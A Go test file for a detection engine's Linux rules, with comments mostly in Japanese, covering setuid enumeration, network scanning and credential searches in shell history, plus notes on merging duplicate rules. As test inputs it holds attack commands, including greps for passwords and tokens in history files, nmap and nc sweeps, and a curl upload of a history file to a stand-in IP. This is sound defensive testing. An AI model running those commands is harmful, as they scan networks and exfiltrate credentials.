package detection

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestLinuxBuiltins verifies the Linux detection-content additions (④ Linux
// detection thickness) fire on canonical Linux手口 and stay quiet on benign
// look-alikes, through the real EvaluateEnvelope oracle.

func evalLinuxProc(image, cmd string) []EvalFinding {
	if image == "" {
		image = "/bin/sh"
	}
	return EvaluateEnvelope("process", map[string]interface{}{
		"type":         "process",
		"image_path":   image,
		"process_name": image,
		"command_line": cmd,
		"action":       "create",
	})
}

// ── T1548.001: setuid/setgid enumeration ──

func TestLinux_SetuidEnumeration_Fires(t *testing.T) {
	cases := []struct{ image, cmd string }{
		{"/usr/bin/find", "find / -perm -4000 -type f 2>/dev/null"},
		{"/usr/bin/find", "find / -perm -u=s -type f"},
		{"/usr/bin/find", "find / -perm /6000"},
	}
	for _, c := range cases {
		if f := evalLinuxProc(c.image, c.cmd); !firedTitleContains(f, "Setuid/Setgid Binary Enumeration") {
			t.Errorf("setuid列挙が検知されるべき: %q → %v", c.cmd, titles(f))
		}
	}
}

func TestLinux_SetuidEnumeration_QuietOnBenign(t *testing.T) {
	// find without a setuid-perm predicate must not fire.
	if f := evalLinuxProc("/usr/bin/find", "find /var/log -name '*.log' -mtime -1"); firedTitleContains(f, "Setuid/Setgid Binary Enumeration") {
		t.Error("通常の find は誤検知すべきでない")
	}
}

// ── T1046: network service scanning ──

func TestLinux_NetworkScanning_Fires(t *testing.T) {
	cases := []struct{ image, cmd string }{
		{"/usr/bin/nmap", "nmap -sS -p- 10.0.0.0/24"},
		{"/usr/bin/masscan", "masscan 10.0.0.0/8 -p80,443"},
		{"/bin/nc", "nc -zv 10.0.0.5 1-1024"},
	}
	for _, c := range cases {
		if f := evalLinuxProc(c.image, c.cmd); !firedTitleContains(f, "Network Service Scanning") {
			t.Errorf("ネットワークスキャンが検知されるべき: %q → %v", c.cmd, titles(f))
		}
	}
}

func TestLinux_NetworkScanning_QuietOnBenign(t *testing.T) {
	// nc used for a single connection (no -z sweep) must not fire the scan rule.
	if f := evalLinuxProc("/bin/nc", "nc example.com 443"); firedTitleContains(f, "Network Service Scanning") {
		t.Error("スイープでない nc 接続は誤検知すべきでない")
	}
}

// ── T1552.003: credential search in shell history ──

// タイトルは 2026-08-14 の統合 (migration 430) で
// `Credential Search in Shell History` から `Shell History Credential Search`
// に寄せた。両者は同じ検知を別々に持っていた 4 本のうちの 2 本で、残したのは
// 条件が広い方（削除した側は grep/awk 等の tool を追加で要求していた）。
func TestLinux_HistoryCredentialSearch_Fires(t *testing.T) {
	cases := []struct{ image, cmd string }{
		{"/bin/grep", "grep -i password ~/.bash_history"},
		{"/bin/grep", "grep -E 'aws_secret|token' ~/.zsh_history"},
		// 統合で取り込んだ 2 語。統合前の `Shell History Credential Search` は
		// どちらも持っておらず、消えた側にしか無かった検知である。
		{"/bin/grep", "grep -i credential /home/v/.history"},
		{"/bin/grep", "grep -i password /home/v/.dbshell"},
	}
	for _, c := range cases {
		if f := evalLinuxProc(c.image, c.cmd); !firedTitleContains(f, "Shell History Credential Search") {
			t.Errorf("履歴の認証情報探索が検知されるべき: %q → %v", c.cmd, titles(f))
		}
	}
}

func TestLinux_HistoryCredentialSearch_QuietOnBenign(t *testing.T) {
	// grep over a normal file (not a history file) must not fire.
	if f := evalLinuxProc("/bin/grep", "grep -i error /var/log/syslog"); firedTitleContains(f, "Shell History Credential Search") {
		t.Error("履歴以外への grep は誤検知すべきでない")
	}
}

// TestT1552_003_QuietOnOrdinaryRecall は、2026-08-13 に T1552.003 の 4 本を
// 狭めた理由そのものを固定する。
//
// FP ソークで この技法は **10 件 / 5999.94 件(1000ホスト/日)** を出し、Sigma ルール中で
// 最多タイだった。鳴っていたのは以下で、いずれも「前に叩いたあのコマンド何だっけ」
// という日常操作である。**履歴を読むこと自体は攻撃ではない。**
//
// ★ 当時この技法のルールは 4 本あった:
//
//	Shell History Credential Search                 sigma_builtins.go   ← 現存
//	Credential Search in Shell History              sigma_builtins.go   削除 (430)
//	Credential Harvesting from Shell or DB History  migration 386 → 427 無効化 (430)
//	Shell History Credential Search (DB)            migration 350 → 427 無効化 (430)
//
// dedup.deduplicateByTechnique が mitre_technique で束ねるためスコアカードには
// 1 行としてしか現れず、**1 本でも広いまま残せば誤検知は消えない**。だから
// タイトルを指定せず「T1552.003 のものが 1 つでも鳴ったら失敗」で見る。
// 2026-08-14 に builtin 1 本へ統合した (migration 430) が、この見方は変えない
// ——2 本目が足されたときに気づけるのはこの形だけである。
func TestT1552_003_QuietOnOrdinaryRecall(t *testing.T) {
	// 対照。実在する攻撃形が鳴らないなら、以下の沈黙チェックは何も確かめていない。
	if f := evalLinuxProc("/bin/grep", "grep -i password /home/v/.bash_history"); !firedT1552_003(f) {
		t.Fatal("対照が効いていない: 資格情報を狙った検索が 1 本も鳴っていないので、" +
			"以下の沈黙チェックが通っても意味が無い")
	}

	// tests/fpsoak/profiles/ の実コマンドそのもの。
	benign := []struct{ image, cmd, why string }{
		{"/bin/grep", "grep -n docker /home/kobayashi/.bash_history", "dev-machine.toml"},
		{"/usr/bin/grep", "grep -n kubectl /Users/ishikawa/.zsh_history", "macbook.toml"},
		{"/usr/bin/grep", "grep docker /Users/ishikawa/.zsh_history", "macbook.toml"},
		{"/bin/cat", "cat /home/v/.bash_history", "自分の履歴を眺めるだけ"},
		{"/usr/bin/less", "less ~/.zsh_history", "同上"},
		{"/bin/grep", "grep -n 'git rebase' ~/.bash_history", "コマンド想起"},
	}
	for _, c := range benign {
		if f := evalLinuxProc(c.image, c.cmd); firedT1552_003(f) {
			t.Errorf("日常のコマンド想起で誤検知している (%s): %q → %v", c.why, c.cmd, titles(f))
		}
	}

	// 狭めても落ちてはならない側。資格情報を狙う検索と、履歴の持ち出し。
	attack := []struct{ image, cmd string }{
		{"/bin/grep", "grep -i password ~/.bash_history"},
		{"/bin/grep", `grep -i -E 'pass|token|secret' /home/v/.bash_history`},
		{"/bin/grep", "grep -E 'aws_secret|token' ~/.zsh_history"},
		{"/usr/bin/strings", "strings /home/v/.bash_history"},
		{"/bin/cp", "cp /home/v/.bash_history /tmp/.x"},
		{"/usr/bin/curl", "curl -T /home/v/.bash_history https://198.51.100.9/u"},
		{"/usr/bin/base64", "base64 /home/v/.zsh_history"},
	}
	for _, c := range attack {
		if f := evalLinuxProc(c.image, c.cmd); !firedT1552_003(f) {
			t.Errorf("資格情報の収穫が検知されなくなった: %q → %v", c.cmd, titles(f))
		}
	}
}

// TestMigration427NarrowsHistoryRule は DB 側の 1 本を直接見る。
//
// 上の TestT1552_003_QuietOnOrdinaryRecall は EvaluateEnvelope 経由なので
// **builtin 2 本しか通らない**。残る 2 本は rules テーブル由来（migration 350 と 386）で、
// そこを狭めたのは migration 427 である。4 本のうち 1 本でも広いまま残れば誤検知は
// 消えないので、DB 側 2 本も同じ入力で確かめる。
//
// migrationSigmaBlocks はファイル名順に同名タイトルを上書きするため、427 の
// UPDATE 本文が 386 の INSERT 本文に勝つ。ここで拾えているのは**最新の本文**である。
//
// なお 2026-08-14 の統合 (migration 430) で、この 2 行は enabled=false になった。
// 本テストは残す: 行が再有効化されたときに、狭める前の広い条件で戻ってこないことを
// 押さえる層である。無効化されているから条件は何でもいい、とはしない。
func TestMigration427NarrowsHistoryRule(t *testing.T) {
	blocks := migrationSigmaBlocks(t)

	// DB 側は 2 本ある。**2 本目は最初の調査で見落とした。**
	// 技法 dedup がスコアカードを 1 行にまとめるため、builtin を狭めるまで存在が
	// 見えず、狭めた直後の計測 (CI run 31718937863) で
	// `Shell History Credential Search (DB)` が新規 6 件として現れて初めて分かった。
	// タイトルで探すと同名別置きを取りこぼす——技法で横断的に洗うこと。
	for _, title := range []string{
		"Credential Harvesting from Shell or DB History", // migration 386 → 427
		"Shell History Credential Search (DB)",           // migration 350 → 427
	} {
		t.Run(title, func(t *testing.T) {
			blk, ok := blocks[title]
			if !ok {
				t.Fatalf("ルール %q が migration から消えている", title)
			}
			if blk.file != "427_narrow_shell_history_credential_rule.sql" {
				t.Fatalf("427 の UPDATE 本文ではなく %s を拾っている——"+
					"狭める前の本文を試していることになる", blk.file)
			}

			ev := NewSigmaEvaluator()
			if err := ev.LoadRule(blk.body); err != nil {
				t.Fatalf("%s のロードに失敗: %v", blk.file, err)
			}
			fires := func(cmd string) bool {
				event := map[string]interface{}{"type": "process", "command_line": cmd, "image": "/bin/grep"}
				addPipelineSigmaAliases(event)
				for _, m := range ev.EvaluateEvent(event) {
					if m.RuleTitle == title {
						return true
					}
				}
				return false
			}

			if !fires(`grep -i password /home/v/.bash_history`) {
				t.Fatal("対照が効いていない: 資格情報を狙った検索が鳴らないので、以下の沈黙チェックに意味が無い")
			}
			for _, cmd := range []string{
				`grep -n docker /home/kobayashi/.bash_history`,
				`grep -n kubectl /Users/ishikawa/.zsh_history`,
				`grep docker /Users/ishikawa/.zsh_history`,
			} {
				if fires(cmd) {
					t.Errorf("日常のコマンド想起で誤検知している（DB 側）: %q", cmd)
				}
			}
			for _, cmd := range []string{
				`grep -i -E 'pass|token|secret' /home/v/.bash_history`,
				`cp /home/v/.bash_history /tmp/.x`,
			} {
				if !fires(cmd) {
					t.Errorf("資格情報の収穫が検知されなくなった（DB 側）: %q", cmd)
				}
			}
		})
	}
}

// TestT1552_003_RuleInventory は、この技法で**生きているルールが 1 本だけ**である
// ことを固定する。
//
// かつては 4 本あった。**技法 dedup はスコアカードもアラート一覧も 1 行にまとめるので、
// 数字を見ているだけでは本数が分からない。** 実際この作業では 3 本と思い込んで是正し、
// FP ソークで 4 本目が新規アラートとして現れて初めて誤りに気づいた（#746）。
// 同じ条件を 4 箇所で歩調を合わせて保守するのは無理があるので、migration 430 で
// builtin 1 本に統合した。
//
// 統合後もソース上には 4 つのタイトルが残る（migration の本文は履歴として消さない）
// ので、**「存在するか」ではなく「生きているか」で数える**。DB 側 2 本は
// migration 430 が enabled=false にしていることを SQL から読んで確かめる。
func TestT1552_003_RuleInventory(t *testing.T) {
	// 生きている実装。ここが 2 本以上になったら、また歩調合わせが始まっている。
	wantLive := map[string]bool{
		"Shell History Credential Search": true, // builtin
	}
	// ソース上には残るが migration 430 で無効化した行。削除しないのは
	// alerts.rule_id が ON DELETE SET NULL で、消すと過去アラートとの紐付けが
	// 切れるため（377 / 383 と同じ扱い）。
	wantDisabled := map[string]bool{
		"Credential Harvesting from Shell or DB History": true, // migration 386 → 427 → 430
		"Shell History Credential Search (DB)":           true, // migration 350 → 427 → 430
	}
	want := map[string]bool{}
	for title := range wantLive {
		want[title] = true
	}
	for title := range wantDisabled {
		want[title] = true
	}

	// 無効化は「そう書いたつもり」では足りない。SQL から読む。
	mig, err := os.ReadFile(filepath.Join("..", "..", "migrations",
		"430_disable_t1552_003_duplicate_db_rules.sql"))
	if err != nil {
		t.Fatalf("migration 430 が読めない: %v", err)
	}
	for title := range wantDisabled {
		if !strings.Contains(string(mig), "WHERE name = '"+title+"';") {
			t.Errorf("migration 430 が %q を無効化していない——"+
				"統合したつもりで 2 本目が生きたままになっている", title)
		}
	}

	// 技法の書き方は 2 通りある。builtin は YAML の `tags: attack.t1552.003`、
	// migration 386 系は SQL の `mitre_tags` 列に持たせ、本文には参照 URL
	// (.../techniques/T1552/003/) しか無い。片方だけ見ると取りこぼす——
	// このセッションで実際に踏んだ形なので、両方を見る。
	isT1552003 := func(body string) bool {
		return strings.Contains(body, "attack.t1552.003") || strings.Contains(body, "T1552/003")
	}

	got := map[string]bool{}
	for _, y := range builtinSigmaRules {
		if isT1552003(y) {
			if m := ruleTitleRe.FindStringSubmatch(y); m != nil {
				got[strings.TrimSpace(m[1])] = true
			}
		}
	}
	for title, blk := range migrationSigmaBlocks(t) {
		if isT1552003(blk.body) {
			got[title] = true
		}
	}
	if len(got) == 0 {
		t.Fatal("対照が効いていない: T1552.003 のルールが 1 本も見つからない。" +
			"検索が壊れているので、本数の検査に意味が無い")
	}

	for title := range want {
		if !got[title] {
			t.Errorf("T1552.003 のルール %q が見つからない——削除したなら want からも外すこと", title)
		}
	}
	for title := range got {
		if !want[title] {
			t.Errorf("T1552.003 のルールが増えている: %q。"+
				"この技法は 4 本に増えた前科があり、技法 dedup のせいで増えたことが"+
				"アラート数からは見えない。既存の %q に条件を足して済むなら足すこと。"+
				"どうしても別ルールが要るなら wantLive に追加し、"+
				"TestT1552_003_QuietOnOrdinaryRecall の沈黙ケースも通ることを確かめる",
				title, "Shell History Credential Search")
		}
	}
}

// firedT1552_003 reports whether ANY rule covering this technique fired.
//
// 統合 (migration 430) 後に生きているのは 1 本だけだが、**タイトルを列挙する形は
// 残す**。1 本に絞ったつもりで 2 本目が足されたとき、片方のタイトルだけを見ていると
// 誤検知がもう一方の下で生き延びる——それがこの技法で実際に起きたことである
// (#746)。ここに並ぶタイトルは TestT1552_003_RuleInventory が本数ごと固定する。
func firedT1552_003(f []EvalFinding) bool {
	for _, title := range []string{
		"Shell History Credential Search", // 唯一生きている実装 (builtin)
		// 以下は migration 430 で無効化済み。api の builtin 評価では出てこないが、
		// 再有効化されたときに沈黙テストが素通りしないよう残してある。
		"Credential Harvesting from Shell or DB History",
	} {
		if firedTitleContains(f, title) {
			return true
		}
	}
	return false
}
